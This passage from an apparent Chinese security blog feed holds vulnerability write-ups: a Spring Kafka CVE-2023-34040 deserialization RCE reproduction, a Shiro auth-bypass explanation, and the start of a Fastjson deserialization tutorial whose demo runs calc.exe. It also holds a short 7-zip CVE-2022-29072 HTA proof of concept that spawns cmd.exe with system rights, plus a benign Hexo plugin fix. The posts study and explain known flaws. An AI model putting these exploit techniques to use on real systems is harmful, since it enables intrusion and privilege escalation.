<p><a href="https://github.com/spring-projects/spring-kafka/pull/2770/files">https://github.com/spring-projects/spring-kafka/pull/2770/files</a></p>
<p>另外，在<code>ErrorHandlingDeserializer</code>中找到其反序列化过程中会删除的<code>Record headers</code></p>
<p><img src="/archives/6725ab5c/image-20230825140629315.png" alt="image-20230825140629315"></p>
<p><img src="/archives/6725ab5c/image-20230825140646451.png" alt="image-20230825140646451"></p>
<p>由此可知会被删除的<code>header</code>为<code>springDeserializerExceptionKey</code> 与<code>springDeserializerExceptionValue</code>，这也意味着漏洞可能就发生在这两个<code>header</code>的值中。所以，此时，我们需要在生产消息的时候为消息增加这两个消息头。</p>
<p><img src="/archives/6725ab5c/image-20230825141730204.png" alt="image-20230825141730204"></p>
<p>这里模拟了用户发送<code>HTTP</code>请求设置消息的情况</p>
<p><img src="/archives/6725ab5c/image-20230825141818830.png" alt="image-20230825141818830"></p>
<p>在前面提到的漏洞存在的条件中，提到需要设置<code>checkDeserExWhenKeyNull</code>  或者<code>checkDeserExWhenValueNull</code>为<code>True</code>，我们首先找到这两个变量在<code>ConsumerProperties</code>类中。顾名思义，这是一个与消费者相关的配置。</p>
<p><img src="/archives/6725ab5c/image-20230825142000043.png" alt="image-20230825142000043">  </p>
<p>这两个配置需要在创建消费者容器工厂的时候配置为<code>True</code>，现在我们的漏洞复现环境才算完整。</p>
<p><img src="/archives/6725ab5c/image-20230825142139127.png" alt="image-20230825142139127"></p>
<p>我们到上面提到的<code>commit</code>记录中找到一个新增的测试类</p>
<p><img src="/archives/6725ab5c/image-20230825140825140.png" alt="image-20230825140825140"></p>
<p>这个测试类的功能大概是模拟了一条消息，其携带了<code>Value</code>类型的反序列化异常消息头，即：<code>springDeserializerExceptionValue</code></p>
<p><img src="/archives/6725ab5c/image-20230825141001937.png" alt="image-20230825141001937"></p>
<p>然后通过调用<code>SerializationUtils.getExceptionFromHeader</code>方法查看是否能够返回一个<code>Exception</code>对象，若不能则测试通过。同时我们注意到该<code>commit</code>很多地方将<code>ListenerUtils.getExceptionFromHeader</code>方法替换为<code>SerializationUtils.getExceptionFromHeader</code>方法</p>
<p><img src="/archives/6725ab5c/image-20230825141159475.png" alt="image-20230825141159475"></p>
<p>那么证明<code>SerializationUtils.getExceptionFromHeader</code>方法中存在漏洞的修复，而按照原始的逻辑执行代码会导致漏洞。</p>
<p>那么我们将断点打在<code>ListenerUtils.getExceptionFromHeader</code>处进行调试：</p>
<p><img src="/archives/6725ab5c/image-20230825142315918.png" alt="image-20230825142315918"></p>
<p>这个时候可以通过<code>IDEA</code>查看以下程序的调用栈</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">checkDeser:<span class="number">2766</span>, KafkaMessageListenerContainer$ListenerConsumer (org.springframework.kafka.listener)</span><br><span class="line">invokeOnMessage:<span class="number">2648</span>, KafkaMessageListenerContainer$ListenerConsumer (org.springframework.kafka.listener)</span><br><span class="line">doInvokeRecordListener:<span class="number">2577</span>, KafkaMessageListenerContainer$ListenerConsumer (org.springframework.kafka.listener)</span><br><span class="line">doInvokeWithRecords:<span class="number">2457</span>, KafkaMessageListenerContainer$ListenerConsumer (org.springframework.kafka.listener)</span><br><span class="line">invokeRecordListener:<span class="number">2335</span>, KafkaMessageListenerContainer$ListenerConsumer (org.springframework.kafka.listener)</span><br><span class="line">invokeListener:<span class="number">2006</span>, KafkaMessageListenerContainer$ListenerConsumer (org.springframework.kafka.listener)</span><br><span class="line">invokeIfHaveRecords:<span class="number">1375</span>, KafkaMessageListenerContainer$ListenerConsumer (org.springframework.kafka.listener)</span><br><span class="line">pollAndInvoke:<span class="number">1366</span>, KafkaMessageListenerContainer$ListenerConsumer (org.springframework.kafka.listener)</span><br><span class="line">run:<span class="number">1257</span>, KafkaMessageListenerContainer$ListenerConsumer (org.springframework.kafka.listener)</span><br><span class="line">call:<span class="number">511</span>, Executors$RunnableAdapter (java.util.concurrent)</span><br><span class="line">run$$$capture:<span class="number">266</span>, FutureTask (java.util.concurrent)</span><br><span class="line">run:-<span class="number">1</span>, FutureTask (java.util.concurrent)</span><br></pre></td></tr></table></figure>

<p>在第8行的代码逻辑中有两个重要的地方，在<code>doPoll</code>方法中会完成消息的反序列化得到<code>records</code>对象，这中间需要保证消息拥有正确的数据格式以避免发生异常导致程序不能运行到第<code>1366</code>行<code>invokeIfHaveRecords</code>方法处，所谓<code>invokeIfHaveRecords</code>即在消费者成功获取到消息并反序列化后调用程序中设置的监听器回调进行跟进一步的处理，即被<code>KafkaListener</code>注解修饰的逻辑的处理逻辑，不过在进行这步操作前包含一些必要的检测，如：记录<code>Headers</code>元数据的检查。</p>
<p><img src="/archives/6725ab5c/image-20230825142705028.png" alt="image-20230825142705028"></p>
<p>回到<code>ListenerUtils.getExceptionFromHeader</code>的调用逻辑。该方法首先在<code>104</code>行处获取到记录headers能够与<code>headerName</code> 变量值<code>springDeserializerExceptionKey</code>匹配的头信息。然后将该标头的值取出来调用<code>byteArrayToDeserializationException</code>方法</p>
<p><img src="/archives/6725ab5c/image-20230825143236166.png" alt="image-20230825143236166"></p>
<p>在<code>byteArrayToDeserializationException</code>方法中有典型的反序列化逻辑，不过因为该部分代码重写了<code>resolveClass</code>方法限制了反序列化目标类的全类名必须为<code>org.springframework.kafka.support.serializer.DeserializationException</code> 所以不能进行任意类的反序列化。</p>
<p><img src="/archives/6725ab5c/image-20230825143426712.png" alt="image-20230825143426712"></p>
<p><code>DeserializationException</code>含有一个有参构造方法，其接受<code>4</code>个参数分别表示异常提示信息、异常数据、是否是<code>key</code>反序列化异常以及导致异常的原因</p>
<p><img src="/archives/6725ab5c/image-20230825143718977.png" alt="image-20230825143718977"></p>
<p>第四个参数是一个对象，其类型是一个顶级的异常接口，如果存在一个其实现类含有可被利用的代码，便可进行反序列化漏洞利用。这里我们自行编写了一个异常类，该异常类在被加载的时候便会执行静态代码块中的代码。</p>
<p><img src="/archives/6725ab5c/image-20230825144018653.png" alt="image-20230825144018653"></p>
<p>使用以下代码生成序列化数据</p>
<p><img src="/archives/6725ab5c/image-20230825144234496.png" alt="image-20230825144234496"></p>
<p>将该数据通过<code>send</code>接口发送给<code>kafka</code>服务器</p>
<p><img src="/archives/6725ab5c/image-20230825144326564.png" alt="image-20230825144326564"></p>
<p>成功<code>RCE</code></p>
<p><img src="/archives/6725ab5c/image-20230825144409214.png" alt="image-20230825144409214"></p>
<p>可以注意到，该漏洞利用限制很多。很多配置都并不是常用配置，所以讲到危害其实是有限的。反序列化的目标对象会在第一次被发序列化后被缓存下来，所以复现时可能会出现第一次成功，后面测试不成功的现象。</p>
<p>另外，此处我们用的是自定义的异常类，那么在生产环境中，这类<code>Gadgets</code>怎么找呢？其实可以参考下<code>FastJSON V1.2.80</code>那个反序列化漏洞，其利用的<code>Gadgets</code>就是一些实现了<code>Throwable</code>接口的异常类。</p>
<h2 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h2><ol>
<li>升级软件到不受影响的版本或最新版，官方仓库地址：<a href="https://github.com/spring-projects/spring-kafka/releases%EF%BC%9B">https://github.com/spring-projects/spring-kafka/releases；</a></li>
<li>规范编码，避免不受信任用户编辑消息元数据；</li>
<li>配置<code>ErrorHandlingDeserializer</code>进行异常处理。</li>
</ol>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-34040">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-34040</a></li>
<li><a href="https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2023-34040">https://www.cvedetails.com/cve-details.php?t=1&amp;cve_id=CVE-2023-34040</a></li>
<li><a href="https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2023-34040">https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2023-34040</a></li>
<li><a href="https://spring.io/security/cve-2023-34040">https://spring.io/security/cve-2023-34040</a></li>
<li><a href="https://github.com/spring-projects/spring-kafka/pull/2770/files">https://github.com/spring-projects/spring-kafka/pull/2770/files</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞分析</category>
        <category>安全技术</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>反序列化</tag>
        <tag>网络安全</tag>
        <tag>漏洞分析</tag>
        <tag>漏洞</tag>
        <tag>Spring Kafka</tag>
        <tag>CVE-2023-34040</tag>
      </tags>
  </entry>
  <entry>
    <title>Nacos 文件上传功能条件竞争RCE</title>
    <url>/archives/2d3cd237.html</url>
    <content><![CDATA[<p><a href="https://uzzju.com/post/87.java">https://uzzju.com/post/87.java</a><br><a href="https://rivers.chaitin.cn/blog/cqcu0eh0lnee0vjd59i0">https://rivers.chaitin.cn/blog/cqcu0eh0lnee0vjd59i0</a></p>
]]></content>
  </entry>
  <entry>
    <title>Java线程复用导致的认证绕过</title>
    <url>/archives/59540e36.html</url>
    <content><![CDATA[<h1 id="线程池复用TreadLocal"><a href="#线程池复用TreadLocal" class="headerlink" title="线程池复用TreadLocal"></a>线程池复用TreadLocal</h1><h1 id="静态变量未同步"><a href="#静态变量未同步" class="headerlink" title="静态变量未同步"></a>静态变量未同步</h1><h1 id="缓存处理不当"><a href="#缓存处理不当" class="headerlink" title="缓存处理不当"></a>缓存处理不当</h1><p>tomcat rce</p>
<h1 id="异步操作处理不当"><a href="#异步操作处理不当" class="headerlink" title="异步操作处理不当"></a>异步操作处理不当</h1><p>nacos rce</p>
]]></content>
  </entry>
  <entry>
    <title>解决hexo-next主题上游仓库改变告警</title>
    <url>/archives/cf1ba47f.html</url>
    <content><![CDATA[<p>找到安装的<code>hexo-next-title hexo-next-share hexo-next-exif hexo-next-utteranc</code>等插件的安装目录 在其目录下找到<code>node_modules</code>目录<br>观察是否存在 <code>next-util</code> 目录，若存在打开该目录中的<code>index.js</code>进行修改<br>注释调添加的<code>before_generate</code>过滤器  </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> yaml = <span class="built_in">require</span>(<span class="string">&#x27;js-yaml&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; merge &#125; = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="keyword">function</span>(<span class="params">hexo, pluginDir</span>) &#123;</span><br><span class="line">  hexo.<span class="property">extend</span>.<span class="property">filter</span>.<span class="title function_">register</span>(<span class="string">&#x27;before_generate&#x27;</span>, <span class="keyword">function</span> <span class="title function_">err</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">//hexo.log.warn(`The upstream repository of theme NexT has been changed.`);</span></span><br><span class="line">    <span class="comment">//hexo.log.warn(`For more information: https://github.com/next-theme/hexo-theme-next`);</span></span><br><span class="line">    <span class="comment">//hexo.log.warn(`Documentation: https://theme-next.js.org`);</span></span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">hexo</span> = hexo;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">pluginDir</span> = pluginDir;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">getFilePath</span> = <span class="keyword">function</span>(<span class="params">file</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">pluginDir</span> ? path.<span class="title function_">resolve</span>(<span class="variable language_">this</span>.<span class="property">pluginDir</span>, file) : file;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">getFileContent</span> = <span class="keyword">function</span>(<span class="params">file</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> fs.<span class="title function_">readFileSync</span>(<span class="variable language_">this</span>.<span class="title function_">getFilePath</span>(file), <span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">defaultConfigFile</span> = <span class="keyword">function</span>(<span class="params">key, file</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> defaultConfig = file ? yaml.<span class="title function_">safeLoad</span>(<span class="variable language_">this</span>.<span class="title function_">getFileContent</span>(file)) : &#123;&#125;;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">hexo</span>.<span class="property">config</span>[key] = <span class="title function_">merge</span>(defaultConfig[key], <span class="variable language_">this</span>.<span class="property">hexo</span>.<span class="property">theme</span>.<span class="property">config</span>[key], <span class="variable language_">this</span>.<span class="property">hexo</span>.<span class="property">config</span>[key]);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">hexo</span>.<span class="property">config</span>[key];</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>bug修复</category>
        <category>tips</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>hexo-next</tag>
        <tag>The upstream repository of theme NexT has been changed</tag>
      </tags>
  </entry>
  <entry>
    <title>7-zip权限提升漏洞【CVE-2022-29072】</title>
    <url>/archives/e8630e46.html</url>
    <content><![CDATA[<p>这玩意儿很简单，原理不清楚，不过7-zip官方并不承认这个漏洞，他们说这个洞是微软的锅，不过我看也确实是。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HTA:APPLICATION</span> <span class="attr">ID</span>=<span class="string">&quot;7zipcodeexec&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;jscript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> c = <span class="string">&quot;cmd.exe&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&#x27;WScript.Shell&#x27;</span>).<span class="title class_">Run</span>(c);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>找个文本文件把上面的内容写进去，然后讲后缀名改为7z。然后讲这个文件拖动到7zip的helper窗口中就会弹出DOS窗口，查看当前权限可以看到为system权限</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>权限提升</tag>
        <tag>7-zip</tag>
        <tag>CVE-2022-29072</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Shiro RegExPatternMatcher 认证绕过【CVE-2022-32532】</title>
    <url>/archives/9f1a1388.html</url>
    <content><![CDATA[<p>利用了正则元字符<code>.</code>默认不能匹配换行符的特性绕过了权限检查步骤，但因为在路径中插入了空白字符构造的路径是畸形的不一定能够匹配到有效的路径，<br>除非后续步骤中有过程处理掉该空白字符，就想当初的另一个shiro 权限绕过一样<code>..;</code>，利用了spring boot的特性将<code>..;</code>去掉了，并有目录穿越。<br>前段时间的spring security据说也是利用这个原理实现的绕过，只能说雷声大雨点小。修复的方式也很简单无非就是让<code>.</code>能够匹配到换行符就ok了。</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>apache shiro</tag>
        <tag>认证绕过</tag>
        <tag>CVE-2022-32532</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjson反序列化漏洞原理分析及复现</title>
    <url>/archives/38dceb78.html</url>
    <content><![CDATA[<p>@<a href="Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0">TOC</a></p>
<h1 id="Fastjson序列化与反序列化"><a href="#Fastjson序列化与反序列化" class="headerlink" title="Fastjson序列化与反序列化"></a>Fastjson序列化与反序列化</h1><h2 id="常规反序列化"><a href="#常规反序列化" class="headerlink" title="常规反序列化"></a>常规反序列化</h2><p>Fastjson的序列化与反序列化与常规的java反序列化不同，我们先来看一下正常的java反序列化，使用下面一段代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.javabase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Unserialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;Unserilize.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//新建一个对象</span></span><br><span class="line">            <span class="type">UnserializeTest</span> <span class="variable">unserializeTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnserializeTest</span>();</span><br><span class="line">            unserializeTest.name = <span class="string">&quot;armandhe&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//序列化</span></span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">            outputStream.writeObject(unserializeTest);</span><br><span class="line">            outputStream.close();</span><br><span class="line"><span class="comment">//            fileOutputStream.close();</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//反序列化</span></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">UnserializeTest</span> <span class="variable">o</span> <span class="operator">=</span> (UnserializeTest) objectInputStream.readObject();</span><br><span class="line">                System.out.println(o.name);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UnserializeTest</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException&#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;执行了readObject函数！！&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<blockquote>
<p>反序列化的单词被我拼错了，尴尬，懒得改了</p>
</blockquote>
<p>我们知道在java中要实现序列化的类的的实例，其类必须实现Serializable或者Externalizable接口，Serializable接口是一个空接口，其只是作为一个标志，而Externalizable这是对Serializable接口的再一次封装，如下图：</p>
<ul>
<li>Serializable接口<br><img src="https://i-blog.csdnimg.cn/blog_migrate/07de0133c7b3f58fdb4e11e6552128b8.png" alt="在这里插入图片描述"></li>
<li>Externalizable接口<br><img src="https://i-blog.csdnimg.cn/blog_migrate/212c7e8b414b9efadc307060d698e207.png" alt="在这里插入图片描述"><br>可以看到Externalizable继承了Serializable接口，并添加了自己的方法。<br>因为这个原因，我们在demo中首先编写了一个UnserializeTest类用于被序列化，该类中重写了readObject方法，个人感觉也不算是重写，因为没有@override注解，应该是应为作用域的缘故导致在调用的时候先只能执行了本类中的readObject方法，在该类中我们执行了操作系统命令弹出一个计算机，并打印了一段话。<br>demo代码运行的结果就是，会在控制台打印：</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">执行了readObject函数！！</span></span><br><span class="line"><span class="string">armandhe</span></span><br></pre></td></tr></table></figure>
<p>并生成一个Userilize.txt文件和弹出计算机，如下图：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5cacf695b502f8230904fb0374ca5a4c.png" alt="在这里插入图片描述"><br>我们通过常规的方式打开Unserilize.txt会看到一堆乱码：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/41d8629728724b938a6fcdbe4839f1b8.png" alt="在这里插入图片描述"><br>所以我们使用linux的xxd命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">xxd Unserilize.txt</span><br></pre></td></tr></table></figure>
<p>或者在windows中使用010editor打开它：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8f9292c92bd8d12b06758601d1ac4f7c.png" alt="在这里插入图片描述"><br>需要注意的特征是，开头的ACED0005，这个是java序列化数据的特征，有助于我们快速定位程序的反序列化利用点。其实后面的73 72也有特定的含义，不过具体的我忘记了，感兴趣的朋友可以自行查询。我们可以利用工具对该数据进行解析：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/407450606885d51de67358e3bcf93471.png" alt="在这里插入图片描述"><br>这样我们就可以看到对象序列化之前对应的类，以及其中其中的可被序列化的methods与fields。<br>常规java序列化调用的是writeObject方法，反序列化则调用的是readObject方法，如果目标类在实现的时候重写了readObject方法想我们的demo代码一样，并包含有一些危险的操作的参数是用户可控的话，那么就可能导致反序列化漏洞。</p>
<h2 id="Fastjson序列化与反序列化-1"><a href="#Fastjson序列化与反序列化-1" class="headerlink" title="Fastjson序列化与反序列化"></a>Fastjson序列化与反序列化</h2><p>Fastjson可以将JSONObject或者javaBean序列化为JSON字符串。关于javaBean的只是可以参考廖雪峰的网站：<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">javaBean是什么</a></p>
<p>Fastjson在对javaBean进行序列化的时候会调用它的所有get或者is方法，反序列化的时候会调用所有的set方法，我们可以看下面的代码，如果这个set方法中含有一些危险的调用链，我们则可以利用这个反序列化过程来执行我们自己的命令：<br>首先我们准备一个javaBean，FastjsonUnserilizeTest.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.javabase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonUnserilizeTest</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getname方法！&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setname方法！&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getage方法！&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setage方法！&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后是序列化与反序列化代码,FastjsonUnserilizeMain.java：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.javabase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonUnserilizeMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//新建对象</span></span><br><span class="line">        System.out.println(<span class="string">&quot;新建对象：&quot;</span>);</span><br><span class="line">        <span class="type">FastjsonUnserilizeTest</span> <span class="variable">fastjsonUnserilizeTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FastjsonUnserilizeTest</span>();</span><br><span class="line">        fastjsonUnserilizeTest.setName(<span class="string">&quot;armband&quot;</span>);</span><br><span class="line">        fastjsonUnserilizeTest.setAge(<span class="number">24</span>);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        System.out.println(<span class="string">&quot;\n序列化：&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> JSON.toJSONString(fastjsonUnserilizeTest, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:25,\&quot;name\&quot;:\&quot;armbandnewpy\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        System.out.println(<span class="string">&quot;\n反序列化：&quot;</span>);</span><br><span class="line">        <span class="type">FastjsonUnserilizeTest</span> <span class="variable">fastjsonUnserilizeTest1</span> <span class="operator">=</span> JSON.parseObject(s, FastjsonUnserilizeTest.class);</span><br><span class="line">        System.out.println(fastjsonUnserilizeTest1);</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> fastjsonUnserilizeTest1.getName();</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行后控制控制台打印：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e04a4f51c024bbfa1ca69f40ba0493cb.png" alt="在这里插入图片描述"><br>第一部分是在我们新建对象的时候调用了两次set方法<br>第二部分是在序列化的时候调用了get方法<br>第三部分是在反序列化的时候调用了set方法<br>注意到Fastjson中序列化调用的是JSON.toJSONString方法，反序列化调用的是JSON.parseObject方法。</p>
<h1 id="Fastjson发序列化漏洞原理"><a href="#Fastjson发序列化漏洞原理" class="headerlink" title="Fastjson发序列化漏洞原理"></a>Fastjson发序列化漏洞原理</h1><p>我们注意到在进行序列化操作的时候JSON.toJSONString方法有一个参数SerializerFeature.WriteClassName，这个参数就是在序列化是包含类名，也就是这个参数导致了Fastjson的反序列化漏洞，这个参数实现的功能在Fastjson中被称作AutoType，即自动类型。如果不添加这个参数我们的javaBean序列化后应该是这样的：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ded9132a1e351e460033a0f6271c6baa.png" alt="在这里插入图片描述"><br>对比一下包含有上述参数：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/10feefd1c9ed9c4ffa16560dfddd199b.png" alt="在这里插入图片描述"><br>可以看到多了一个@type参数。<br>如果没有SerializerFeature.WriteClassName参数，我们在进行反序列化时，代码这样写：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String s= <span class="string">&quot;&#123;\&quot;age\&quot;:25,\&quot;name\&quot;:\&quot;armbandnewpy\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(s);</span><br></pre></td></tr></table></figure>
